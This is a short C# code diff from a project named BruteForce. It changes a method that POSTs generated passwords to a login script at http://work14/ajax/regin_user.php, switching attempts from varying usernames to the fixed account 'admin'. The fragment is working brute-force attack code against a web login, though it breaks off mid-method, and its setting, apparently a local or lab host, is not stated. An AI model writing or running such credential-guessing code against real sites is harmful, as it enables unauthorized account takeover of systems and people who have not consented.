@@ -18,19 +18,18 @@ namespace BruteForce
             Start = DateTime.Now;
             CreatePassword(8, CheckPassword); //!!!!!!!!!!!!!!!!!!!!!!!!!
         }
-        static int i = 0;
         public static void SingIn(string password)
         {
             try
             {
-                i++;
+       
                 string url = "http://work14/ajax/regin_user.php";
            
                 HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(url);
                 Request.Method = "POST";
                 Request.ContentType = "application/x-www-form-urlencoded";
 
-                string PostData = $"login=admin{i}&password={password}";
+                string PostData = $"login=admin&password={password}";
                 byte[] Data = Encoding.ASCII.GetBytes(PostData);
                 Request.ContentLength = Data.Length;
 
